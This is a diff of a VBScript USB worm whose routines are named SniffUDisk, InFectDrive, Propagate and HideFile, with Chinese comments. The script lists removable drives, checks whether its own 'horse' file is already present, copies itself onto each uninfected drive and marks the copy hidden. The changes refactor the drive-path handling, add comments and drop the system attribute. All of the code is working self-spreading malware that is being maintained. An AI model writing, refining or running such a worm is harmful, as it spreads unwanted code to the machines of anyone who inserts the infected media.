@@ -14,25 +14,25 @@ Sub SniffUDisk()
 	For Each drive In SubDrives
 		drivePath = drive.DriveLetter
 		If drive.DriveType = 1 And drive.IsReady Then
-			Call InFect(drivePath)
+			Call InFectDrive(drivePath & ":\")
 		End If
 	Next
 	Set objFileSystem = Nothing
 	Set SubDrives = Nothing
 End Sub
 
-Sub InFect(drivePath)
+Sub InFectDrive(drivePath)
 	If HasInfected(drivePath) = False Then
-		WScript.Echo "Have not infected " & drivePath & ":\ yet."
-		Call Propagate(drivePath & ":\")
+		WScript.Echo "Have not infected " & drivePath & " yet."
+		Call Propagate(drivePath)
 	End If
 End Sub
 
-Function HasInfected(drivePath)
+Function HasInfected(drivePath) '判断是否已经感染过指定盘符
 	Dim objFileSystem
 	Set objFileSystem = CreateObject("Scripting.FileSystemObject")
 	horseName = objFileSystem.GetFile(Wscript.ScriptFullName).Name
-	horsePath = drivePath & ":\" & horseName
+	horsePath = drivePath & horseName
 	
 	HasInfected = False
 	If objFileSystem.FileExists(horsePath) Then
@@ -44,7 +44,7 @@ End Function
 
 Sub Propagate(targetPath) '复制自身到指定文件夹
 	Dim objFileSystem
-	Set objFileSystem = WScript.CreateObject("scripting.filesystemobject")
+	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
 	
 	sourcePath = objFileSystem.GetFile(Wscript.ScriptFullName)
 	sourceName = objFileSystem.GetFile(Wscript.ScriptFullName).Name
@@ -63,11 +63,11 @@ Sub Propagate(targetPath) '复制自身到指定文件夹
 	Set objFileSystem = Nothing
 End Sub
 
-Sub HideFile(filePath)
+Sub HideFile(filePath) '将文件属性修改为隐藏
 	Dim objFileSystem, objFile
-	Set objFileSystem = WScript.CreateObject("scripting.filesystemobject")
+	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
 	Set objFile = objFileSystem.GetFile(filePath)
-	objFile.Attributes = 4 + 2 '0-普通 1-只读 2-隐藏 4-系统
+	objFile.Attributes = 2 '0-普通 1-只读 2-隐藏 4-系统
 	Set objFileSystem = Nothing
 	Set objFile = Nothing
 End Sub
